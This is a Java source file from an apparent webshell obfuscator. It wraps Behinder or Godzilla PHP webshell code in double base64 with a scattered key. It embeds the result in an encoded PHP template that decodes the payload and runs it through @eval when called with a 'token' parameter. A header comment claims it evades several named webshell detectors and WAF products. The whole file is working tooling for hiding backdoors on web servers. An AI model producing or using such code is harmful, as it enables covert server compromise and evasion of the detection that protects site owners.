package encode;

import application.RandomString;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo3 {
    String tamplate;
    String sourcecode;
    String key;
    String MScode;
    String Describe;
    String meta;

    public PhpEncodeDemo3() {
    }

    public PhpEncodeDemo3(String tamplate, String sourcecode, String key) {
        this.tamplate = tamplate;
        this.sourcecode = sourcecode;
        this.key = key;
    }

    public static String GetDescribe(){
        return  "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-09-05_demo3\n" +
                " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                " * 传参: /xxxx.php?token=xxxxxxxxxxxxxxxxxx\n" +
                " */";
    }

    public String[] Run(){

        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);

                String base64code = Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));
                if(this.key.equals("默认随机")){
                    this.key = RandomString.getRString(8);
                }

                StringBuilder stringBuilder = new StringBuilder(base64code);
                int aa = new Random().nextInt((stringBuilder.length())/2)+1;
                for (int i = aa;  i > 0; i = new Random().nextInt(i)) {
                    stringBuilder.insert(i,this.key);
                }
                base64code = stringBuilder.toString();


                String demo3 = "PD9waHAgLyo8bWV0YSBuYW1lPSIkbWV0YSQiIGNvbnRlbnQ9IiRrZXkkIj4qLwokcGFzc3dvcmQ9JyRiYXNlNjRjb2RlJCc7CiR1c2VybmFtZSA9IGdldF9tZXRhX3RhZ3MoX19GSUxFX18pWyRfR0VUWyd0b2tlbiddXTsKaGVhZGVyKCJkZGRkZGRkOiIuJHVzZXJuYW1lKTsKJGFyciA9IGFwYWNoZV9yZXNwb25zZV9oZWFkZXJzKCk7CiR0ZW1wbGF0ZV9zb3VyY2U9Jyc7CmZvcmVhY2ggKCRhcnIgYXMgJGsgPT4gJHYpIHsKICAgIGlmICgka1swXSA9PSAnZCcgJiYgJGtbNV0gPT0gJ2QnKSB7CiAgICAgICAgJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR2LCcnLCRwYXNzd29yZCk7CiAgICB9fQokdGVtcGxhdGVfc291cmNlID0gYmFzZTY0X2RlY29kZSgkdGVtcGxhdGVfc291cmNlKTsKJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiRrZXkgPSAndGVtcGxhdGVfc291cmNlJzsKJGFlc19kZWNvZGVbMV09JCRrZXk7CkBldmFsKCRhZXNfZGVjb2RlWzFdKTs=";
                MScode = new String(Base64.getDecoder().decode(demo3));
                this.meta = RandomString.getRString(6);
                MScode = MScode.replace("$meta$",this.meta);
                MScode = MScode.replace("$key$",this.key);
                MScode = MScode.replace("$base64code$",base64code);

                Describe = "/*\n" +
                        " * By: XG小刚\n" +
                        " * Time: 2023-09-05_demo3\n" +
                        " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                        " * 传参: /xxxx.php?token="+this.meta.toLowerCase()+"\n" +
                        " */";
                return new String[]{this.MScode,this.Describe};
            }catch (Exception e){
                return new String[]{"加密失败",this.Describe};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉php源码", this.Describe};
        }
    }
}
